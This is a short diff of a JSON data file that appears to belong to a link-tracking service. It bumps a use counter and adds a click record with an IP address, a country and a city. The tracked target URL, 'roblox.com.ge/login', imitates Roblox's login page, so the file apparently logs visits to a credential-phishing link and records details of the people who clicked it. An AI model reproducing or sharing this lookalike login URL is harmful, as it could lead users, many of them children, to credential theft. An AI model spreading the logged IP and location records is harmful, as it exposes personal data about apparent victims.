@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1695,
+    "useCount": 1696,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13728,6 +13728,14 @@
         "city": "San Vicente de Chucurí",
         "flag": "🇨🇴",
         "countryCode": "CO"
+      },
+      {
+        "timestamp": 1777661295289,
+        "ip": "181.78.44.8",
+        "country": "Honduras",
+        "city": "Carbajales",
+        "flag": "🇭🇳",
+        "countryCode": "HN"
       }
     ]
   },
